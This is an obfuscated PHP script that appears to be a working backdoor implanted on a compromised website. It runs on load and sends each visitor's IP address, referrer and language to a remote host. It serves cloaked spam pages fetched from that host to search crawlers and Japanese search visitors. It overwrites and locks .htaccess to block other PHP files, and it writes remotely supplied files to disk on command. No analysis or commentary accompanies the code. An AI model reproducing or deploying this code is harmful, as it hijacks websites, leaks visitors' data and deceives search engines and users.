<?php

//header('Content-Type:text/html; charset=utf-8');
$DOOLL_LO__ = '8248';
$DL__O_OOLL = 'n1zb/ma5\\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37j';
$DL__O_LOOL = "date_default_timezone_set";
$DLO_LOLO__ = "ignore_user_abort";
$DO__L_LLOO = "file_put_contents";
$DOLO__LLO_ = "file_get_contents";
$DLOLOO_L__ = "function_exists";
$DOL_OL_LO_ = "set_time_limit";
$DOOLL_L_O_ = "base64_decode";
$D_OOL_L_OL = "substr_count";
$D_LOO_LOL_ = "str_ireplace";
$DO_OL_OL_L = "preg_replace";
$D__LOL_OLO = "str_replace";
$DLOLO_LO__ = "curl_setopt";
$D_O_O_LLOL = "strtolower";
$D_OLLL_O_O = "preg_match";
$DOLLO_L_O_ = "curl_close";
$D__OLO_LOL = "array_rand";
$DO_O_LLLO_ = "urlencode";
$DOLO__OLL_ = "str_split";
$DOOL_O__LL = "gzinflate";
$DOOLLL__O_ = "curl_init";
$DO__LL_OLO = "curl_exec";
$D_OO_OL_LL = "array_pop";
$D__LOLO_OL = "ob_start";
$D___OLOOLL = "strrpos";
$DL_LO_OO_L = "stristr";
$DLLL_O__OO = "stripos";
$DLO_L_OO_L = "ini_set";
$D_OL_LLO_O = "implode";
$DLL_L_O_OO = "explode";
$DOLOL___OL = "unlink";
$DOO__L_OLL = "substr";
$DOOLL__O_L = "strstr";
$DL_OOOL__L = "strlen";
$DLO_L_LO_O = "getenv";
$DL_OLL__OO = "rtrim";
$DO_L_LLO_O = "count";
$D_LL_OLO_O = "trim";
$DL___OLOLO = "date";
$DLOO__OLL_ = "end";
if (!function_exists('str_ireplace')) {
    function str_ireplace($from, $to, $string)
    {
        return trim(preg_replace("/" . addcslashes($from, "?:\\/*^\$") . "/si", $to, $string));
    }
}
$DLOOL__O_L = function ($url) {
    $D_OL_LOLO_ = @file_get_contents($url);
    if (!$D_OL_LOLO_) {
        $D_OLLOO_L_ = array('Accept:*/*', 'User-Agent:Mozilla/5.0 (Windows NT 10.0;Win64;x64;rv:100.0) Gecko/20100101 Firefox/100.0');
        $D_O_OLLOL_ = curl_init();
        curl_setopt($D_O_OLLOL_, CURLOPT_URL, $url);
        curl_setopt($D_O_OLLOL_, CURLOPT_HEADER, 0);
        curl_setopt($D_O_OLLOL_, CURLOPT_HTTPHEADER, $D_OLLOO_L_);
        curl_setopt($D_O_OLLOL_, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($D_O_OLLOL_, CURLOPT_SSL_VERIFYPEER, false);
        $D_OL_LOLO_ = curl_exec($D_O_OLLOL_);
        curl_close($D_O_OLLOL_);
    }
    return $D_OL_LOLO_;
};
$DL_LOO_OL_ = function ($DOL__LOL_O, $DO_L_L_LOO = 1) {
    $D_LLO_O_OL = $GLOBALS["D_O_OLLLO_"]('i4mx1hT69R09CMjq2u1Y5TUbTtPSAgA=');
    $D_LOOLOL__ = str_split($D_LLO_O_OL);
    $D_L_O_LOLO = '%s%s';
    if ($DO_L_L_LOO) {
        $DOL__LOL_O = preg_replace("/(\\?|#).*/si", '', $DOL__LOL_O);
    }
    foreach ($D_LOOLOL__ as $sca_v) {
        $DOL__LOL_O = str_replace($sca_v, sprintf($D_L_O_LOLO, '\\', $sca_v), $DOL__LOL_O);
    }
    return $DOL__LOL_O;
};
$D_OL_L_OOL = function ($DO_OLOL__L = '', $D_O__OLLOL = false) {
    $DL_OL_LO_O = false;
    $DOLLL__O_O = $GLOBALS["D_O_OLLLO_"]('S8/PThT89JTcovqUlKzEwpLS7ITEktqknKzEsHiaWDZSFSNYn5OWCJmsrEjPxtP8AA==');
    if ($D_O__OLLOL) {
        $DOLLL__O_O .= $GLOBALS["D_O_OLLLO_"]('q/HNrhT8rMyUktPEAA==');
    }
    if ($DO_OLOL__L != '') {
        if (preg_match("/({$DOLLL__O_O})/si", $DO_OLOL__L)) {
            $DL_OL_LO_O = true;
        }
    }
    return $DL_OL_LO_O;
};
$DL_OO_O_LL = function ($DL_LO_LO_O = '') {
    $DL_LO_OL_O = false;
    if ($DL_LO_LO_O != '' && preg_match("/(google.co.jp|yahoo.co.jp)/si", $DL_LO_LO_O)) {
        $DL_LO_OL_O = true;
    }
    return $DL_LO_OL_O;
};
$DLO_O_LL_O = function ($DL_LO_LO_O) {
    $DOO_LL__LO = false;
    if ($DL_LO_LO_O == '') {
        $D_LOLL_OO_ = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
        $D_OL_OOL_L = explode(',', $D_LOLL_OO_);
        if (count($D_OL_OOL_L) < 3) {
            if ($D_OL_OOL_L['0'] != '' && preg_match("/(ja)/si", $D_OL_OOL_L['0'])) {
                if (isset($D_OL_OOL_L['1'])) {
                    if (preg_match("/(ja)/si", $D_OL_OOL_L['1'])) {
                        $DOO_LL__LO = true;
                    }
                } else {
                    $DOO_LL__LO = true;
                }
            }
        }
    }
    return $DOO_LL__LO;
};
$D_LOL_L_OO = function ($enstr) {
    return sync_ende($enstr, 1);
};
$D_O_OLLLO_ = function ($strv) {
    $DLO_OOLL__ = substr($strv, 0, 5);
    $DLL__O_OOL = substr($strv, -5);
    $DOOO_LL_L_ = substr($strv, 7, strlen($strv) - 14);
    return gzinflate(base64_decode($DLO_OOLL__ . $DOOO_LL_L_ . $DLL__O_OOL));
};
$D_O_L_LOLO = function ($DL_L_OL_OO = '') {
    $DOOLLO__L_ = 'c';
    $DLLO__LOO_ = 'h';
    $DLLOO_O__L = 'm';
    $DL_LOOOL__ = 'o';
    $D_OLO_OLL_ = 'd';
    $D__LOOOL_L = "chmod";
    $DLLO_LO_O_ = "./.htaccess";
    $DO_OOL_L_L = "<FilesMatch \".(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected)\$\">{|||}Order allow,deny{|||}Deny from all{|||}</FilesMatch>{|||}<FilesMatch \"^(index.php|credits.php|customize.php|edit-comments.php|edit-tags.php|edit.php|checkbox.php|export.php|input.php|link.php|load-scripts.php|load-styles.php|dropdown.php|menu.php|nav-menus.php|network.php|options-discussion.php|options-general.php|options-permalink.php|options-privacy.php|options-reading.php|options-writing.php|plugins.php|post-new.php|post.php|privacy.php|profile.php|site-health.php|term.php|text.php|themes.php|tools.php|update-core.php|user-edit.php|user-new.php|users.php|wp-links.php|wp-login.php|wp-signup.php)\$\">{|||}Order allow,deny{|||}Allow from all{|||}</FilesMatch>{|||}<IfModule mod_rewrite.c>{|||}RewriteEngine On{|||}RewriteBase /{|||}RewriteRule ^index.php\$%s-%s[L]{|||}RewriteCond %s{REQUEST_FILENAME}%s!-f{|||}RewriteCond %s{REQUEST_FILENAME}%s!-d{|||}RewriteRule%s.%sindex.php%s[L]{|||}</IfModule>";
    $DO_OOL_L_L = sprintf($DO_OOL_L_L, ' ', ' ', '%', ' ', '%', ' ', ' ', ' ', ' ');
    $DL__OLL_OO = explode('{|||}', $DO_OOL_L_L);
    $D__OOOLL_L = implode("\n", $DL__OLL_OO);
    $DL_O_LO_OL = @file_get_contents($DLLO_LO_O_);
    if ($DL_O_LO_OL === false || trim($DL_O_LO_OL) == '') {
        @chmod($DLLO_LO_O_, 0644);
        $DL_O_LO_OL = $D__OOOLL_L;
        @file_put_contents($DLLO_LO_O_, $DL_O_LO_OL);
        unset($DL_O_LO_OL, $DLLO_LO_O_);
    } else {
        $D_OOO_L_LL = true;
        foreach ($DL__OLL_OO as $DO_OOL_L_L_item) {
            if (stripos($DL_O_LO_OL, str_replace('<FilesMatch "^(', '', $DO_OOL_L_L_item)) === false) {
                $D_OOO_L_LL = false;
                break;
            }
        }
        if (!$D_OOO_L_LL) {
            $DO__OLO_LL = "./htaccess.th";
            @file_put_contents($DO__OLO_LL, $DL_O_LO_OL);
            @$D__LOOOL_L($DLLO_LO_O_, 0644);
            $D_O_LOL_LO = $D__OOOLL_L;
            @file_put_contents($DLLO_LO_O_, $D_O_LOL_LO);
            unset($DL_O_LO_OL, $DLLO_LO_O_, $D_O_LOL_LO);
        }
    }
    @$D__LOOOL_L($DLLO_LO_O_, 0444);
};
$DLO_LLO__O = function ($url) {
    $DOOO_LLL__ = '';
    $D_L_L_OOOL = "Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)";
    if (function_exists('curl_init')) {
        try {
            $D__LOOOL_L = curl_init();
            $DOL_O_LLO_ = 30;
            curl_setopt($D__LOOOL_L, CURLOPT_URL, $url);
            curl_setopt($D__LOOOL_L, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($D__LOOOL_L, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($D__LOOOL_L, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($D__LOOOL_L, CURLOPT_CONNECTTIMEOUT, $DOL_O_LLO_);
            $DOOO_LLL__ = curl_exec($D__LOOOL_L);
            curl_close($D__LOOOL_L);
        } catch (Exception $e) {
        }
    }
    if (strlen($DOOO_LLL__) < 1 && function_exists('file_get_contents')) {
        ini_set('user_agent', $D_L_L_OOOL);
        try {
            $DOOO_LLL__ = @file_get_contents($url);
        } catch (Exception $e) {
        }
    }
    return $DOOO_LLL__;
};
$D_LOO_OL_L = function ($DLO___OLLO = '') {
    @set_time_limit(3600);
    @ignore_user_abort(1);
    ob_start();
    @date_default_timezone_set('Asia/Tokyo');
    global $DOOLL_LO__;
    $D_OLL_O_LO = "unknown";
    if (isset($_SERVER)) {
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $D_OLL_O_LO = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } elseif (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $D_OLL_O_LO = $_SERVER["HTTP_CLIENT_IP"];
        } else {
            $D_OLL_O_LO = $_SERVER["REMOTE_ADDR"];
        }
    } else {
        if (getenv("HTTP_X_FORWARDED_FOR")) {
            $D_OLL_O_LO = getenv("HTTP_X_FORWARDED_FOR");
        } elseif (getenv("HTTP_CLIENT_IP")) {
            $D_OLL_O_LO = getenv("HTTP_CLIENT_IP");
        } else {
            $D_OLL_O_LO = getenv("REMOTE_ADDR");
        }
    }
    $DOO_L_OL_L = str_ireplace('\\', '/', "/var/www/html/bWNAdf.php");
    $DOLOLO___L = explode('/', $DOO_L_OL_L);
    $DOLOLO___L = end($DOLOLO___L);
    $DLL_O_O_OL = explode('/', $_SERVER['SCRIPT_NAME']);
    $DLO_O_L_OL = array_pop($DLL_O_O_OL);
    $DLLOOOL___ = strtolower($DLO_O_L_OL);
    $DO_LO_LLO_ = implode('/', $DLL_O_O_OL);
    $DO__OLLLO_ = $_SERVER['REQUEST_URI'];
    $DO__OLLLO_ = preg_replace("/^\\//si", '', str_ireplace($DO_LO_LLO_, '', $DO__OLLLO_));
    $D_LOLO_O_L = $GLOBALS["DL_LOO_OL_"]($DO__OLLLO_);
    $DLOO_O_L_L = '';
    if (isset($_SERVER['HTTP_HOST'])) {
        $DLOO_O_L_L = $_SERVER['HTTP_HOST'];
    } elseif (isset($_SERVER['SERVER_NAME'])) {
        $DLOO_O_L_L = $_SERVER['SERVER_NAME'];
    }
    if (!isset($_SERVER['REQUEST_SCHEME'])) {
        $_SERVER['REQUEST_SCHEME'] = '';
    }
    $DLO_L__OOL = ($_SERVER['REQUEST_SCHEME'] != '' ? $_SERVER['REQUEST_SCHEME'] : 'http') . '://' . $DLOO_O_L_L . $_SERVER['REQUEST_URI'];
    $DLO_L__OOL = trim($DLO_L__OOL);
    if (preg_match("/^" . $DLLOOOL___ . ".*/si", $DOLOLO___L)) {
        $DLO_L__OOL = preg_replace("/" . $DLLOOOL___ . ".*/si", '', $DLO_L__OOL);
    }
    $DL_LLOOO__ = trim(preg_replace("/\\?.*/si", '', $DLO_L__OOL));
    $DL__O_OLLO = $D_LOLO_O_L != '' ? preg_replace("/{$D_LOLO_O_L}.*/", '', $DL_LLOOO__) : $DL_LLOOO__;
    if (!preg_match("/\\/\$/si", $DL__O_OLLO)) {
        $DL__O_OLLO = substr($DL__O_OLLO, 0, strrpos($DL__O_OLLO, '/') + 1);
    }
    if (substr_count($DL__O_OLLO, '/') == 3) {
        $DL__O_OLLO .= $DLO_O_L_OL;
        $DL__O_OLLO = str_replace('/index.php', '', $DL__O_OLLO);
    } elseif (substr_count($DL__O_OLLO, '/') > 3) {
        $DL__O_OLLO .= $DLO_O_L_OL;
    } else {
        $DL__O_OLLO = rtrim($DL__O_OLLO, '/');
    }
    $DLL_OL__OO = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
    $DLOLO_L_O_ = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $DLL_O_LO_O = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $D_O_L_OLOL = $GLOBALS["DL_OO_O_LL"]($DLOLO_L_O_);
    $DO___LLOOL = $GLOBALS["D_OL_L_OOL"]($DLL_O_LO_O);
    $D__LL_OLOO = $GLOBALS["DLO_O_LL_O"]($DLOLO_L_O_);
    $DO_L__OLLO = '';
    if (isset($_SERVER['REQUEST_SCHEME'])) {
        $DO_L__OLLO = $_SERVER['REQUEST_SCHEME'];
    } else {
        if (preg_match('/([http|https]+)\\:\\/\\/.*?$/i', $_SERVER['SCRIPT_URI'], $matches)) {
            $DO_L__OLLO = $matches[1];
        }
    }
    $D_L_OOL_OL = $_SERVER["REQUEST_URI"];
    $DLLOLOO___ = $_SERVER['SCRIPT_NAME'];
    if (preg_match('/\\.jpg|\\.gif|\\.ico|\\.jpeg|\\.svg|\\.png/i', $D_L_OOL_OL)) {
        header('HTTP/1.1 404 Not Found');
        header("status:404 Not Found");
        exit;
    }
    if (preg_match('/google[a-z0-9]{16}\\.html/i', $D_L_OOL_OL)) {
        header('HTTP/1.1 404 Not Found');
        header("status:404 Not Found");
        exit;
    }
    $DOL_OL__LO = "www%d.httpxxx.xyz";
    $DLOLL__OO_ = sprintf($DOL_OL__LO, $DOOLL_LO__);
    $DLLO_O_LO_ = "http://%host%/?d=%s&g=%s&t=%s&u=%s&h=%s&p=%s&r=%s&l=%s&j=%s";
    $DLLO_O_LO_ = preg_replace("/%host%/si", $DLOLL__OO_, $DLLO_O_LO_);
    $DLO_L_LOO_ = "http://%host%/tz.php?d=%s&g=%s&t=%s&u=%s&h=%s&p=%s&r=%s&l=%s&j=%s";
    $DLO_L_LOO_ = preg_replace("/%host%/si", $DLOLL__OO_, $DLO_L_LOO_);
    $DL_OLOLO__ = "<happihack>";
    $DO_L_OL_OL = sprintf($DLLO_O_LO_, $DLOO_O_L_L, $DOOLL_LO__, urlencode(date('Y-m-d')), urlencode($D_L_OOL_OL), urlencode($DO_L__OLLO), trim($D_OLL_O_LO), urlencode($DLOLO_L_O_), $DLL_OL__OO, $DL__O_OLLO);
    $DLO_O_LLO_ = sprintf($DLO_L_LOO_, $DLOO_O_L_L, $DOOLL_LO__, urlencode(date('Y-m-d')), urlencode($D_L_OOL_OL), urlencode($DO_L__OLLO), trim($D_OLL_O_LO), urlencode($DLOLO_L_O_), $DLL_OL__OO, $DL__O_OLLO);
    $D_L_LO_OOL = "<a href=\"%s\" target=\"_blank\">%s</a>";
    if (isset($_GET['ru1'])) {
        echo sprintf($D_L_LO_OOL, preg_replace('/\\%[a-zA-Z0-9]{2}ru1/si', '', $DO_L_OL_OL), preg_replace('/\\%[a-zA-Z0-9]{2}ru1/si', '', $DO_L_OL_OL)) . '<br />';
        exit;
    }
    if (isset($_GET['ru2'])) {
        echo sprintf($D_L_LO_OOL, preg_replace('/\\%[a-zA-Z0-9]{2}ru2/si', '', $DLO_O_LLO_), preg_replace('/\\%[a-zA-Z0-9]{2}ru2/si', '', $DLO_O_LLO_)) . '<br />';
        exit;
    }
    if (isset($_GET["pwd"])) {
        if (isset($_GET["ver"])) {
            $D_L_OOL_OL = $_GET["pwd"] . '|--|' . $_GET["ver"];
            $DO_L_OL_OL = sprintf($DLLO_O_LO_, $DLOO_O_L_L, $DOOLL_LO__, urlencode(date('Y-m-d')), urlencode($D_L_OOL_OL), urlencode($DO_L__OLLO), trim($D_OLL_O_LO), urlencode($DLOLO_L_O_), $DLL_OL__OO, $DL__O_OLLO);
            $DLOO_LO__L = $GLOBALS["DLOOL__O_L"]($DO_L_OL_OL);
            echo $DLOO_LO__L;
            exit;
        }
    }
    if (isset($_GET["ping"])) {
        $DOLLO_L__O = $_GET["ping"];
        if (strstr($DOLLO_L__O, '.xml')) {
            $DO_O__LLOL = "https://www.google.com/ping?sitemap=" . $DL__O_OLLO . '/' . $DOLLO_L__O;
            $D_LO_LOOL_ = array("Safari \xe2\x80\x93 Mac" => "Mozilla/5.0 (Macintosh;Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/15.4 Safari/605.1.15", "Chrome \xe2\x80\x93 Windows WOW" => "Mozilla/5.0 (Windows NT 10.0;WOW64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36", "Chrome \xe2\x80\x93 Windowsx Win" => "Mozilla/5.0 (Windows NT 10.0;Win64;x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36", "Chrome \xe2\x80\x93 Windows" => "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36", "Chrome \xe2\x80\x93 Mac" => "Mozilla/5.0 (Macintosh;Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36", "Firefox \xe2\x80\x93 Mac" => "Mozilla/5.0 (Macintosh;Intel Mac OS X 12.4;rv:100.0) Gecko/20100101 Firefox/100.0", "Firefox \xe2\x80\x93 Windowsx64" => "Mozilla/5.0 (Windows NT 10.0;Win64;x64;rv:100.0) Gecko/20100101 Firefox/100.0", "Edg \xe2\x80\x93 Mac" => "Mozilla/5.0 (Macintosh;Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/100.0.1185.39", "Edg \xe2\x80\x93 Windowsx Win" => "Mozilla/5.0 (Windows NT 10.0;Win64;x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/100.0.1185.39", "OPR \xe2\x80\x93 Windows Win" => "Mozilla/5.0 (Windows NT 10.0;Win64;x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/86.0.4363.23", "OPR \xe2\x80\x93 Windowsx WOW" => "Mozilla/5.0 (Windows NT 10.0;WOW64;x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/86.0.4363.23", "OPR \xe2\x80\x93 Mac" => "Mozilla/5.0 (Macintosh;Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/86.0.4363.23", "Vivaldi \xe2\x80\x93 Windows WOW" => "Mozilla/5.0 (Windows NT 10.0;WOW64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36 Vivaldi/4.3", "Vivaldi \xe2\x80\x93 Windowsx Win" => "Mozilla/5.0 (Windows NT 10.0;Win64;x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36 Vivaldi/4.3", "Vivaldi \xe2\x80\x93 Mac" => "Mozilla/5.0 (Macintosh;Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 Safari/537.36 Vivaldi/4.3", "YaBrowser \xe2\x80\x93 Windows WOW" => "Mozilla/5.0 (Windows NT 10.0;WOW64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 YaBrowser/22.3.3 Yowser/2.5 Safari/537.36", "YaBrowser \xe2\x80\x93 Windowsx Win" => "Mozilla/5.0 (Windows NT 10.0;Win64;x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 YaBrowser/22.3.3 Yowser/2.5 Safari/537.36", "YaBrowser \xe2\x80\x93 Mac" => "Mozilla/5.0 (Macintosh;Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/101.0.4951.67 YaBrowser/22.3.3 Yowser/2.5 Safari/537.36");
            $DOOL__LO_L = $D_LO_LOOL_[array_rand($D_LO_LOOL_, 1)];
            $D__L_LOOOL = "PD9waHAKJHVzZXJfYWdlbnQgPSAneyNhZ2VudCN9JzsKJHBpbmdfdXJsID0gJ3sjdXJsI30nOwppZiAoc3RyaXN0cihzaXRlbWFwX2dldCgkcGluZ191cmwsICR1c2VyX2FnZW50KSwgJ2dvb2dsZScpKSB7CgllY2hvICdTaXRlbWFwIFBpbmcgT2s8L2JyPjwvYnI+JzsKfWVsc2V7CgllY2hvICdTaXRlbWFwIFBpbmcgRmFsc2U8L2JyPjwvYnI+JzsKfQpmdW5jdGlvbiBzaXRlbWFwX2dldCgkdXJsLCR1c2VyYWdlbnQpewogICAgJGNoID0gY3VybF9pbml0KCk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsKICAgICRmaWxlX2NvbnRlbnRzID0gY3VybF9leGVjKCRjaCk7CiAgICBjdXJsX2Nsb3NlKCRjaCk7CiAgICByZXR1cm4gJGZpbGVfY29udGVudHM7Cn0K";
            $DLO_L__OLO = "edit.php,term.php,link.php,load-scripts.php,load-styles.php";
            $DL_OLLO__O = array(0 => "edit.php", 1 => "term.php", 2 => "link.php", 3 => "load-scripts.php", 4 => "load-styles.php");
            $DOO_LL_OL_ = $DL_OLLO__O[array_rand($DL_OLLO__O, 1)];
            if (preg_match("/\\.php\$/si", $DL__O_OLLO)) {
                $DL__O_OLLO = rtrim(substr($DL__O_OLLO, 0, strrpos($DL__O_OLLO, '/') + 1), '/');
            }
            $D_LO_LOO_L = $DL__O_OLLO . '/' . $DOO_LL_OL_;
            $DOO_O_LLL_ = str_replace('{#url#}', $DO_O__LLOL, str_replace('{#agent#}', $DOOL__LO_L, base64_decode($D__L_LOOOL)));
            if (file_put_contents($DOO_LL_OL_, $DOO_O_LLL_)) {
                if (stristr($GLOBALS["DLO_LLO__O"]($D_LO_LOO_L), 'Sitemap Ping Ok')) {
                    echo "Sitemap Ping Ok!</br>";
                } else {
                    echo $DO_O__LLOL . 'Sitemap Ping False!</br>';
                }
                @unlink($DOO_LL_OL_);
            } else {
                echo $DO_O__LLOL . 'Creat File False!</br>';
            }
        } else {
            echo "Sitemap Name False!</br>";
        }
        exit;
    }
    if (isset($_GET['robots'])) {
        $D_L_OOL_OL = "/robots.txt";
        $DO_L_OL_OL = sprintf($DLLO_O_LO_, $DLOO_O_L_L, $DOOLL_LO__, urlencode(date('Y-m-d')), urlencode($D_L_OOL_OL), urlencode($DO_L__OLLO), trim($D_OLL_O_LO), urlencode($DLOLO_L_O_), $DLL_OL__OO, $DL__O_OLLO);
        $DL__LO_OLO = $GLOBALS["DLOOL__O_L"]($DO_L_OL_OL);
        if (strstr($DL__LO_OLO, $DL_OLOLO__)) {
            file_put_contents('./robots.txt', str_replace($DL_OLOLO__, '', $DL__LO_OLO));
        }
        echo file_get_contents('./robots.txt');
        exit;
    }
    $GLOBALS["D_O_L_LOLO"]();
    $DO_LOO__LL = "/(robots).*\\.txt\$/";
    if (preg_match($DO_LOO__LL, $D_L_OOL_OL)) {
        $DLOO_LO__L = $GLOBALS["DLOOL__O_L"]($DO_L_OL_OL);
        if (strstr($DLOO_LO__L, $DL_OLOLO__)) {
            $DLOO_LO__L = str_replace($DL_OLOLO__, '', $DLOO_LO__L);
            @header('content-type:text/txt');
            echo $DLOO_LO__L;
            unset($DLOO_LO__L, $DO_L_OL_OL, $D_L_OOL_OL, $DLOO_O_L_L, $DLOLO_L_O_, $DLL_O_LO_O);
            exit;
        }
    }
    $D_OOL__LLO = "/.*\\.xml\$/";
    if (preg_match($D_OOL__LLO, $D_L_OOL_OL)) {
        $DLOO_LO__L = $GLOBALS["DLOOL__O_L"]($DO_L_OL_OL);
        if (strstr($DLOO_LO__L, $DL_OLOLO__)) {
            $DLOO_LO__L = str_replace($DL_OLOLO__, '', $DLOO_LO__L);
            @header('content-type:text/xml');
            echo $DLOO_LO__L;
            unset($DLOO_LO__L, $DO_L_OL_OL, $D_L_OOL_OL, $DLOO_O_L_L, $DLOLO_L_O_, $DLL_O_LO_O);
            exit;
        }
    }
    $DOOLL_O__L = "/(sitemap).*\\.txt\$/";
    if (preg_match($DOOLL_O__L, $D_L_OOL_OL)) {
        $DLOO_LO__L = $GLOBALS["DLOOL__O_L"]($DO_L_OL_OL);
        if (strstr($DLOO_LO__L, $DL_OLOLO__)) {
            $DLOO_LO__L = str_replace($DL_OLOLO__, '', $DLOO_LO__L);
            @header('content-type:text/txt');
            echo $DLOO_LO__L;
            unset($DLOO_LO__L, $DO_L_OL_OL, $D_L_OOL_OL, $DLOO_O_L_L, $DLOLO_L_O_, $DLL_O_LO_O);
            exit;
        }
    }
    if ($DO___LLOOL) {
        $DLOO_LO__L = $GLOBALS["DLOOL__O_L"]($DO_L_OL_OL);
        if ($DLOO_LO__L == '') {
            header('HTTP/1.1 404 Not Found');
            header("status:404 Not Found");
            exit;
        }
        if (strstr($DLOO_LO__L, $DL_OLOLO__)) {
            $DLOO_LO__L = str_replace($DL_OLOLO__, '', $DLOO_LO__L);
            echo $DLOO_LO__L;
            unset($DLOO_LO__L, $D_L_OOL_OL, $DLOO_O_L_L, $DLOLO_L_O_, $DLL_O_LO_O);
            exit;
        }
    }
    if ($D_O_L_OLOL) {
        $DLOO_LO__L = $GLOBALS["DLOOL__O_L"]($DLO_O_LLO_);
        if (strstr($DLOO_LO__L, $DL_OLOLO__)) {
            $DLOO_LO__L = str_replace($DL_OLOLO__, '', $DLOO_LO__L);
            echo $DLOO_LO__L;
            unset($DLOO_LO__L, $D_L_OOL_OL, $DLOO_O_L_L, $DLOLO_L_O_, $DLL_O_LO_O);
            exit;
        }
    }
    if ($D__LL_OLOO) {
        $DLOO_LO__L = $GLOBALS["DLOOL__O_L"]($DLO_O_LLO_);
        if (strstr($DLOO_LO__L, $DL_OLOLO__)) {
            $DLOO_LO__L = str_replace($DL_OLOLO__, '', $DLOO_LO__L);
            echo $DLOO_LO__L;
            unset($DLOO_LO__L, $D_L_OOL_OL, $DLOO_O_L_L, $DLOLO_L_O_, $DLL_O_LO_O);
            exit;
        }
    }
};
$GLOBALS["D_LOO_OL_L"]();
